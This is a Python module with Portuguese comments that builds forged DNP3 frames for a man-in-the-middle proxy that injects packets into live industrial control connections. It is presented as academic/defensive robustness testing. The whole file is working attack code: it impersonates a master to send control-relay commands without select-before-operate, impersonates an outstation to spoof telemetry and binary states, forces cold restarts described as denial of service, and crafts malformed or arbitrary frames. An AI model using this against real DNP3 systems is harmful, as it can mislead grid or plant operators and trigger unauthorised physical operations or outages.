"""
Construtores de frame DNP3 (IEEE 1815-2012) para o proxy MITM.

Monta frames DNP3 completos (Data Link + Transport + Application) validos,
forjados campo a campo, ou bytes crus. Reaproveita integralmente o codec do
projeto (src/protocols/dnp3/frames.py): nada aqui reimplementa o protocolo,
apenas o usa para impersonar um master ou um outstation ao injetar pacotes no
meio de uma conexao real (ver src/attacks/dnp3_mitm.py).

Uso academico/defensivo: exercitar a robustez de um endpoint DNP3 e evidenciar
que o protocolo nao tem autenticacao nem verificacao de integridade em transito.
"""

from typing import List, Optional

from ..protocols.dnp3.frames import (
    DNP3Codec, DNP3Object, ObjectHeader,
    FunctionCode, ObjectGroup, LinkFunction,
    CLASS_VARIATIONS, QUAL_ALL_POINTS, QUAL_8BIT_COUNT_INDEX,
    VAR_AI_SHORT_FLOAT, VAR_BI_FLAGS,
    CROB_LATCH_ON, CROB_LATCH_OFF,
    IIN_CLASS1_EVENTS,
)


def _fmt_hex(data: bytes) -> str:
    return " ".join(f"{b:02X}" for b in data)


def _parse_value(texto: str):
    """Converte um valor da CLI em bool/int/float."""
    t = texto.strip().lower()
    if t in ("on", "true", "1", "close", "fechar"):
        return True
    if t in ("off", "false", "0", "open", "abrir"):
        return False
    try:
        return int(texto, 0)
    except ValueError:
        pass
    try:
        return float(texto)
    except ValueError:
        return texto


class DNP3AttackSession:
    """Construtor de frames DNP3 com sequencia (app/transport) propria.

    Nao abre socket - e usado pelo proxy MITM para impersonar um lado da
    conversa (o master ao injetar --> outstation, o outstation ao injetar
    --> master), com as sequencias sincronizadas ao que passa de verdade na
    linha (ver DNP3Mitm._track em dnp3_mitm.py).
    """

    def __init__(self, master_address: int = 1, outstation_address: int = 4):
        self.master_address = master_address
        self.outstation_address = outstation_address
        self._app_seq = 0
        self._transport_seq = 0

    def _next_app_seq(self) -> int:
        self._app_seq = (self._app_seq + 1) % 16
        return self._app_seq

    # ------------------------------------------------------------------
    # Empacotamento nas 3 camadas
    # ------------------------------------------------------------------
    def _wrap(self, fragment: bytes, from_master: bool) -> bytes:
        """Envolve um fragmento de aplicacao em transporte + link, com o
        enderecamento do lado que estamos impersonando."""
        if from_master:
            dest, src = self.outstation_address, self.master_address
        else:
            dest, src = self.master_address, self.outstation_address
        out = bytearray()
        for pdu in DNP3Codec.encode_transport(fragment, self._transport_seq):
            out += DNP3Codec.encode_link_frame(
                pdu, dest=dest, src=src,
                func=LinkFunction.UNCONFIRMED_USER, prm=True,
            )
            self._transport_seq = (self._transport_seq + 1) % 64
        return bytes(out)

    def _request(self, func: int, headers: List[ObjectHeader],
                 con: bool = False, uns: bool = False) -> bytes:
        """Fragmento da direcao master --> outstation (requisicao)."""
        frag = DNP3Codec.encode_app_request(func, self._next_app_seq(), headers,
                                             con=con, uns=uns)
        return self._wrap(frag, from_master=True)

    def _response(self, func: int, headers: List[ObjectHeader],
                  iin: int = 0, uns: bool = False) -> bytes:
        """Fragmento da direcao outstation --> master (resposta)."""
        frag = DNP3Codec.encode_app_response(func, self._next_app_seq(), iin,
                                             headers, uns=uns)
        return self._wrap(frag, from_master=False)

    # ------------------------------------------------------------------
    # Requisicoes legitimas (impersonando o master --> outstation)
    # ------------------------------------------------------------------
    def integrity_poll(self) -> bytes:
        """READ Class 0 (varredura completa)."""
        h = ObjectHeader(ObjectGroup.CLASS_OBJECTS, CLASS_VARIATIONS[0],
                         QUAL_ALL_POINTS)
        return self._request(FunctionCode.READ, [h])

    def event_poll(self) -> bytes:
        """READ Class 1/2/3 (eventos pendentes)."""
        headers = [ObjectHeader(ObjectGroup.CLASS_OBJECTS, CLASS_VARIATIONS[c],
                                QUAL_ALL_POINTS) for c in (1, 2, 3)]
        return self._request(FunctionCode.READ, headers)

    def command(self, index: int, on: bool) -> bytes:
        """DIRECT_OPERATE de um CROB - comanda o outstation sem SELECT nem master."""
        code = CROB_LATCH_ON if on else CROB_LATCH_OFF
        h = ObjectHeader(ObjectGroup.BINARY_OUTPUT_CMD, 1, QUAL_8BIT_COUNT_INDEX,
                         [DNP3Object(index=index, value=code)])
        return self._request(FunctionCode.DIRECT_OPERATE, [h])

    def clock_sync(self) -> bytes:
        """WRITE g50v1 (sincronismo de relogio)."""
        import time
        h = ObjectHeader(ObjectGroup.TIME_AND_DATE, 1, QUAL_8BIT_COUNT_INDEX,
                         [DNP3Object(index=0, value=0,
                                     timestamp=int(time.time() * 1000))])
        return self._request(FunctionCode.WRITE, [h])

    # ------------------------------------------------------------------
    # Respostas forjadas (impersonando o outstation --> master)
    # ------------------------------------------------------------------
    def spoof_analog(self, index: int, value: float) -> bytes:
        """Unsolicited Response com um Analog Input forjado - telemetria falsa."""
        h = ObjectHeader(ObjectGroup.ANALOG_INPUT, VAR_AI_SHORT_FLOAT,
                         QUAL_8BIT_COUNT_INDEX,
                         [DNP3Object(index=index, value=float(value))])
        return self._response(FunctionCode.UNSOLICITED_RESP, [h],
                              iin=IIN_CLASS1_EVENTS, uns=True)

    def spoof_binary(self, index: int, on: bool) -> bytes:
        """Unsolicited Response com um Binary Input forjado - estado falso."""
        h = ObjectHeader(ObjectGroup.BINARY_INPUT, VAR_BI_FLAGS,
                         QUAL_8BIT_COUNT_INDEX,
                         [DNP3Object(index=index, value=bool(on))])
        return self._response(FunctionCode.UNSOLICITED_RESP, [h],
                              iin=IIN_CLASS1_EVENTS, uns=True)

    # ------------------------------------------------------------------
    # Frames deliberadamente irregulares
    # ------------------------------------------------------------------
    def sbo_no_select(self, index: int, on: bool) -> bytes:
        """OPERATE sem o SELECT previo (testa se o outstation exige o SBO)."""
        code = CROB_LATCH_ON if on else CROB_LATCH_OFF
        h = ObjectHeader(ObjectGroup.BINARY_OUTPUT_CMD, 1, QUAL_8BIT_COUNT_INDEX,
                         [DNP3Object(index=index, value=code)])
        return self._request(FunctionCode.OPERATE, [h])

    def cold_restart(self) -> bytes:
        """COLD_RESTART - manda o outstation reiniciar (DoS)."""
        return self._request(FunctionCode.COLD_RESTART, [])

    def bad_crc(self, base: Optional[bytes] = None) -> bytes:
        """Frame valido com o ultimo CRC corrompido (testa a validacao de CRC)."""
        frame = bytearray(base if base is not None else self.integrity_poll())
        if frame:
            frame[-1] ^= 0xFF        # corrompe o ultimo byte de CRC
        return bytes(frame)

    # --- construtor generico: qualquer requisicao, campo a campo ---
    def craft(self, func: int, group: int = 0, variation: int = 1,
              qualifier: int = QUAL_8BIT_COUNT_INDEX, index: int = 0,
              val=None, from_master: bool = True) -> bytes:
        objs = []
        if group:
            objs = [DNP3Object(index=index, value=val)]
        headers = [ObjectHeader(group, variation, qualifier, objs)] if group else []
        if from_master:
            frag = DNP3Codec.encode_app_request(func, self._next_app_seq(), headers)
            return self._wrap(frag, from_master=True)
        frag = DNP3Codec.encode_app_response(func, self._next_app_seq(), 0, headers)
        return self._wrap(frag, from_master=False)

    @staticmethod
    def malformed(kind: str = "start") -> bytes:
        """Frames que violam o enquadramento do Data Link DNP3."""
        if kind == "start":                       # bytes de inicio invalidos
            return bytes([0x99, 0x64, 0x05, 0xC4, 0x04, 0x00, 0x01, 0x00,
                          0x00, 0x00])
        if kind == "length":                      # LEN anuncia mais do que existe
            return bytes([0x05, 0x64, 0xFF, 0xC4, 0x04, 0x00, 0x01, 0x00,
                          0x00, 0x00])
        if kind == "trunc":                       # frame cortado no meio do header
            return bytes([0x05, 0x64, 0x14, 0xC4, 0x04])
        return bytes([0x05, 0x64])                # so os start bytes

    @staticmethod
    def raw(hexstr: str) -> bytes:
        """Bytes literais a partir de uma string hex ('05 64 05 C4 ...')."""
        limpo = hexstr.replace("0x", "").replace(",", " ")
        return bytes(int(x, 16) for x in limpo.split())


def build_craft(builder: "DNP3AttackSession", args: List[str]) -> bytes:
    """Interpreta 'func=5 group=12 var=1 index=0 val=3 ...' e monta o frame."""
    kv = {}
    for a in args:
        if "=" in a:
            k, v = a.split("=", 1)
            kv[k.strip().lower()] = v.strip()
    if "func" not in kv:
        raise ValueError("craft exige ao menos func=")

    val = _parse_value(kv["val"]) if "val" in kv else None
    return builder.craft(
        func=int(kv["func"], 0),
        group=int(kv.get("group", 0), 0),
        variation=int(kv.get("var", 1), 0),
        qualifier=int(kv.get("qual", str(QUAL_8BIT_COUNT_INDEX)), 0),
        index=int(kv.get("index", 0), 0),
        val=val,
        from_master=(kv.get("dir", "master").lower() != "outstation"),
    )


def build_from_command(b: "DNP3AttackSession", cmd: str, args: List[str]) -> bytes:
    """Traduz um comando textual em bytes de frame DNP3, usando `b` como construtor.

    Reaproveitado pelo console de gerencia do main.py e pelo proxy MITM. Nao
    envia nada - apenas devolve os bytes prontos, que quem chamou decide para
    onde injetar.
    """
    v = _parse_value
    if cmd in ("integrity", "class0", "poll"):
        return b.integrity_poll()
    if cmd in ("events", "eventpoll"):
        return b.event_poll()
    if cmd == "command":
        return b.command(int(args[0], 0), v(args[1]))
    if cmd == "clock":
        return b.clock_sync()
    if cmd == "spoof":
        return b.spoof_analog(int(args[0], 0), float(args[1]))
    if cmd == "spoofbin":
        return b.spoof_binary(int(args[0], 0), v(args[1]))
    if cmd == "sbo":
        return b.sbo_no_select(int(args[0], 0), v(args[1]))
    if cmd == "restart":
        return b.cold_restart()
    if cmd == "badcrc":
        return b.bad_crc()
    if cmd == "craft":
        return build_craft(b, args)
    if cmd == "raw":
        return b.raw(" ".join(args))
    if cmd == "malformed":
        return b.malformed(args[0] if args else "start")
    raise ValueError(f"comando desconhecido: {cmd}")
